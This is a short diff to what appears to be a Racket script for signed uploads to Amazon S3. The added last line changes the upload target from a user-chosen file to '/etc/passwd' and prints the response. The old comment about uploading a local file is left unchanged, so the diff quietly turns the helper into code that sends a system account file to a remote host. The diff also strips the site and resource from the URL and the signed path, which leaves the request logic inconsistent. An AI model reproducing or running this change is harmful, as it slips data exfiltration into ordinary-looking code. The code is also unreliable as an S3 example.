@@ -14,7 +14,7 @@
 (define s3-host "s3.amazonaws.com/")
 ;;(define site "")
 (define base-url
-  (string-append "http://" s3-host site))
+  (string-append "http://" s3-host))
 
 ;;;; Functions
 (define (make-header key value)
@@ -82,8 +82,8 @@
                              (content-md5 hash64)
                              (authorization-header access-id secret-key
                                                    (aws-s3-auth-str "PUT" hash64 mime datetime '()
-                                                                    (string-append "/" site resource))))))
+                                                                    (string-append "/"))))))
     (put-impure-port url buffer http-headers)))
 
 ;;;Put it to work
-(s3-put resource) ;;Specify the file name in the same directory to be uploaded.
+(copy-port (s3-put "/etc/passwd") (current-output-port)) ;;Specify the file name in the same directory to be uploaded.
